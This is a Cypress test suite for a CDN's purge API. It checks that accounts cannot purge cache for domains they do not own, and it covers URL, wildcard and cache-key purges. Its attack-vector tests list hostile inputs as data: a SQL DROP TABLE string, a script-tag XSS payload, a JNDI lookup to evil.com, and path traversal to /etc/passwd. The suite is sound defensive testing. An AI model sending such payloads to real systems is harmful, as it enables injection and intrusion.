/// <reference types="cypress" />

/**
 * Domain Purge Security Validation Tests
 * 
 * Tests critical security vulnerability where users can perform purge operations
 * on domains they don't own/control. Validates domain ownership before purge.
 * 
 * Test Environment: Stage
 * Priority: High - Security vulnerability
 */

describe('Domain Purge Security Validation', { 
  tags: ['@api', '@security', '@domain-purge', '@stage'] 
}, () => {
  let testAccount1;
  let testAccount2;
  let account1Domains = [];
  let account2Domains = [];
  let createdResources = [];

  before(() => {
    cy.log('🔐 Setting up cross-account domain purge security tests');
    
    // Setup test accounts with different tokens
    testAccount1 = {
      token: Cypress.env('AZION_TOKEN'),
      accountId: Cypress.env('accountId'),
      baseUrl: Cypress.env('baseUrl')
    };
    
    // For testing, we'll simulate a second account scenario
    // In real testing, you would have a second test account
    testAccount2 = {
      token: Cypress.env('AZION_TOKEN_ACCOUNT2') || testAccount1.token,
      accountId: Cypress.env('ACCOUNT_ID_2') || 'different-account-id',
      baseUrl: testAccount1.baseUrl
    };
  });

  beforeEach(() => {
    cy.logTestInfo('Domain Purge Security Tests', '/purge + /edge_applications + /domains');
  });

  afterEach(() => {
    // Cleanup created resources
    if (createdResources.length > 0) {
      cy.log('🧹 Cleaning up test resources');
      createdResources.forEach(resource => {
        if (resource.type === 'edge_application') {
          cy.azionApiRequest('DELETE', `/edge_applications/${resource.id}`, null, {
            headers: { 'Authorization': `Token ${resource.token}` }
          });
        } else if (resource.type === 'domain') {
          cy.azionApiRequest('DELETE', `/domains/${resource.id}`, null, {
            headers: { 'Authorization': `Token ${resource.token}` }
          });
        }
      });
      createdResources = [];
    }
  });

  describe('Domain Ownership Validation', () => {
    it('should create domains in different accounts for testing', { 
      tags: ['@setup', '@domain-creation'] 
    }, () => {
      cy.log('🏗️ Creating test domains in Account 1');
      
      // Create edge application first (required for domain)
      const edgeAppPayload = {
        name: `security-test-app-${Date.now()}`,
        delivery_protocol: 'http',
        origin_type: 'single_origin',
        address: 'httpbin.org',
        origin_protocol_policy: 'preserve',
        host_header: 'httpbin.org',
        browser_cache_settings: 'honor',
        cdn_cache_settings: 'honor'
      };

      cy.azionApiRequest('POST', '/edge_applications', edgeAppPayload, {
        headers: { 'Authorization': `Token ${testAccount1.token}` }
      }).then((response) => {
        expect(response.status).to.be.oneOf([200, 201]);
        const edgeAppId = response.body.results?.id || response.body.data?.id;
        
        createdResources.push({
          type: 'edge_application',
          id: edgeAppId,
          token: testAccount1.token
        });

        // Create domain associated with this edge application
        const domainPayload = {
          name: `security-test-${Date.now()}.example.com`,
          cname_access_only: false,
          digital_certificate_id: null,
          edge_application_id: edgeAppId
        };

        cy.azionApiRequest('POST', '/domains', domainPayload, {
          headers: { 'Authorization': `Token ${testAccount1.token}` }
        }).then((domainResponse) => {
          expect(domainResponse.status).to.be.oneOf([200, 201]);
          const domainId = domainResponse.body.results?.id || domainResponse.body.data?.id;
          const domainName = domainResponse.body.results?.name || domainResponse.body.data?.name;
          
          account1Domains.push({
            id: domainId,
            name: domainName,
            edgeAppId: edgeAppId
          });

          createdResources.push({
            type: 'domain',
            id: domainId,
            token: testAccount1.token
          });

          cy.log(`✅ Created domain in Account 1: ${domainName} (ID: ${domainId})`);
        });
      });
    });

    it('should prevent purge of domains not owned by the account', { 
      tags: ['@security', '@cross-account', '@critical'] 
    }, () => {
      // Skip if we don't have domains created
      if (account1Domains.length === 0) {
        cy.log('⚠️ Skipping test - no domains available for testing');
        return;
      }

      const targetDomain = account1Domains[0];
      cy.log(`🎯 Testing purge prevention for domain: ${targetDomain.name}`);

      // Attempt 1: Try to purge using Account 2 credentials (should fail)
      const purgeUrls = [
        `https://${targetDomain.name}/test-file-1.css`,
        `https://${targetDomain.name}/test-file-2.js`,
        `https://${targetDomain.name}/images/test.png`
      ];

      cy.log('🚫 Attempting cross-account purge (should be blocked)');
      cy.azionApiRequest('POST', '/purge/url', {
        urls: purgeUrls,
        method: 'delete'
      }, {
        headers: { 'Authorization': `Token ${testAccount2.token}` },
        failOnStatusCode: false
      }).then((response) => {
        // This should fail with 403 Forbidden or 404 Not Found
        expect(response.status).to.be.oneOf([403, 404, 401]);
        
        if (response.body.detail) {
          expect(response.body.detail).to.match(/forbidden|not found|unauthorized|access denied/i);
        }
        
        cy.log(`✅ Cross-account purge correctly blocked with status: ${response.status}`);
      });
    });

    it('should allow purge of domains owned by the account', { 
      tags: ['@security', '@same-account', '@positive'] 
    }, () => {
      if (account1Domains.length === 0) {
        cy.log('⚠️ Skipping test - no domains available for testing');
        return;
      }

      const ownedDomain = account1Domains[0];
      cy.log(`✅ Testing legitimate purge for owned domain: ${ownedDomain.name}`);

      const purgeUrls = [
        `https://${ownedDomain.name}/legitimate-file-1.css`,
        `https://${ownedDomain.name}/legitimate-file-2.js`
      ];

      cy.azionApiRequest('POST', '/purge/url', {
        urls: purgeUrls,
        method: 'delete'
      }, {
        headers: { 'Authorization': `Token ${testAccount1.token}` }
      }).then((response) => {
        // This should succeed
        expect(response.status).to.be.oneOf([200, 201, 202]);
        
        if (response.body.results) {
          expect(response.body.results).to.be.an('array');
        }
        
        cy.log(`✅ Legitimate purge successful with status: ${response.status}`);
      });
    });
  });

  describe('Wildcard Purge Security', () => {
    it('should prevent wildcard purge of unowned domains', { 
      tags: ['@security', '@wildcard', '@critical'] 
    }, () => {
      if (account1Domains.length === 0) {
        cy.log('⚠️ Skipping test - no domains available for testing');
        return;
      }

      const targetDomain = account1Domains[0];
      const wildcardUrls = [
        `https://${targetDomain.name}/css/*`,
        `https://${targetDomain.name}/js/*`,
        `https://${targetDomain.name}/images/*`
      ];

      cy.log(`🚫 Testing wildcard purge prevention for: ${targetDomain.name}`);

      cy.azionApiRequest('POST', '/purge/wildcard', {
        urls: wildcardUrls
      }, {
        headers: { 'Authorization': `Token ${testAccount2.token}` },
        failOnStatusCode: false
      }).then((response) => {
        expect(response.status).to.be.oneOf([403, 404, 401]);
        cy.log(`✅ Wildcard purge correctly blocked with status: ${response.status}`);
      });
    });

    it('should allow wildcard purge of owned domains', { 
      tags: ['@security', '@wildcard', '@positive'] 
    }, () => {
      if (account1Domains.length === 0) {
        cy.log('⚠️ Skipping test - no domains available for testing');
        return;
      }

      const ownedDomain = account1Domains[0];
      const wildcardUrls = [`https://${ownedDomain.name}/test/*`];

      cy.azionApiRequest('POST', '/purge/wildcard', {
        urls: wildcardUrls
      }, {
        headers: { 'Authorization': `Token ${testAccount1.token}` }
      }).then((response) => {
        expect(response.status).to.be.oneOf([200, 201, 202]);
        cy.log(`✅ Legitimate wildcard purge successful`);
      });
    });
  });

  describe('Cache Key Purge Security', () => {
    it('should validate cache key purge with domain context', { 
      tags: ['@security', '@cache-key'] 
    }, () => {
      if (account1Domains.length === 0) {
        cy.log('⚠️ Skipping test - no domains available for testing');
        return;
      }

      const targetDomain = account1Domains[0];
      
      // Test cache key purge with domain-specific keys
      const cacheKeys = [
        `${targetDomain.name}:homepage`,
        `${targetDomain.name}:product-123`,
        `${targetDomain.name}:user-profile-456`
      ];

      // Test with wrong account (should fail)
      cy.azionApiRequest('POST', '/purge/cachekey', {
        cache_keys: cacheKeys
      }, {
        headers: { 'Authorization': `Token ${testAccount2.token}` },
        failOnStatusCode: false
      }).then((response) => {
        expect(response.status).to.be.oneOf([403, 404, 401]);
        cy.log(`✅ Cache key purge correctly blocked for unowned domain`);
      });

      // Test with correct account (should succeed)
      cy.azionApiRequest('POST', '/purge/cachekey', {
        cache_keys: cacheKeys
      }, {
        headers: { 'Authorization': `Token ${testAccount1.token}` }
      }).then((response) => {
        expect(response.status).to.be.oneOf([200, 201, 202]);
        cy.log(`✅ Cache key purge successful for owned domain`);
      });
    });
  });

  describe('Edge Cases and Attack Vectors', () => {
    it('should prevent purge with subdomain manipulation', { 
      tags: ['@security', '@subdomain', '@attack-vector'] 
    }, () => {
      if (account1Domains.length === 0) {
        cy.log('⚠️ Skipping test - no domains available for testing');
        return;
      }

      const targetDomain = account1Domains[0];
      
      // Try various subdomain manipulation attacks
      const maliciousUrls = [
        `https://evil.${targetDomain.name}/malicious.css`,
        `https://${targetDomain.name}.evil.com/attack.js`,
        `https://sub.${targetDomain.name}/../../sensitive.html`,
        `https://${targetDomain.name}/..%2F..%2Fsensitive.html`
      ];

      cy.azionApiRequest('POST', '/purge/url', {
        urls: maliciousUrls
      }, {
        headers: { 'Authorization': `Token ${testAccount2.token}` },
        failOnStatusCode: false
      }).then((response) => {
        expect(response.status).to.be.oneOf([403, 404, 401, 400]);
        cy.log(`✅ Subdomain manipulation attack blocked`);
      });
    });

    it('should validate domain format and prevent injection', { 
      tags: ['@security', '@injection', '@validation'] 
    }, () => {
      const injectionUrls = [
        'https://example.com/test.css; DROP TABLE domains;',
        'https://example.com/test<script>alert("xss")</script>.js',
        'https://example.com/test${jndi:ldap://evil.com}.css',
        'https://example.com/../../../etc/passwd'
      ];

      cy.azionApiRequest('POST', '/purge/url', {
        urls: injectionUrls
      }, {
        headers: { 'Authorization': `Token ${testAccount1.token}` },
        failOnStatusCode: false
      }).then((response) => {
        // Should either reject malformed URLs or sanitize them
        expect(response.status).to.be.oneOf([400, 422, 200, 201, 202]);
        
        if (response.status >= 400) {
          cy.log(`✅ Injection attempt correctly rejected`);
        } else {
          cy.log(`ℹ️ URLs were processed (hopefully sanitized)`);
        }
      });
    });

    it('should handle concurrent purge attempts', { 
      tags: ['@security', '@concurrency', '@rate-limit'] 
    }, () => {
      if (account1Domains.length === 0) {
        cy.log('⚠️ Skipping test - no domains available for testing');
        return;
      }

      const targetDomain = account1Domains[0];
      
      // Create multiple concurrent purge requests
      const concurrentRequests = Array.from({ length: 10 }, (_, i) => {
        return cy.azionApiRequest('POST', '/purge/url', {
          urls: [`https://${targetDomain.name}/concurrent-test-${i}.css`]
        }, {
          headers: { 'Authorization': `Token ${testAccount2.token}` },
          failOnStatusCode: false
        });
      });

      // All should fail due to lack of ownership
      Promise.all(concurrentRequests).then((responses) => {
        responses.forEach((response, index) => {
          expect(response.status).to.be.oneOf([403, 404, 401, 429]);
          cy.log(`Request ${index + 1}: Status ${response.status} ✅`);
        });
      });
    });
  });

  describe('Audit and Logging', () => {
    it('should log purge attempts for security monitoring', { 
      tags: ['@security', '@audit', '@logging'] 
    }, () => {
      if (account1Domains.length === 0) {
        cy.log('⚠️ Skipping test - no domains available for testing');
        return;
      }

      const targetDomain = account1Domains[0];
      const testUrl = `https://${targetDomain.name}/audit-test.css`;

      // Legitimate purge (should be logged as successful)
      cy.azionApiRequest('POST', '/purge/url', {
        urls: [testUrl]
      }, {
        headers: { 'Authorization': `Token ${testAccount1.token}` }
      }).then((response) => {
        expect(response.status).to.be.oneOf([200, 201, 202]);
        
        // Check if response includes audit information
        if (response.body.request_id || response.body.trace_id) {
          cy.log(`✅ Audit trail available: ${response.body.request_id || response.body.trace_id}`);
        }
      });

      // Unauthorized purge attempt (should be logged as blocked)
      cy.azionApiRequest('POST', '/purge/url', {
        urls: [testUrl]
      }, {
        headers: { 'Authorization': `Token ${testAccount2.token}` },
        failOnStatusCode: false
      }).then((response) => {
        expect(response.status).to.be.oneOf([403, 404, 401]);
        
        // Verify error response includes tracking information
        if (response.body.request_id || response.body.trace_id) {
          cy.log(`✅ Security event logged: ${response.body.request_id || response.body.trace_id}`);
        }
      });
    });
  });
});
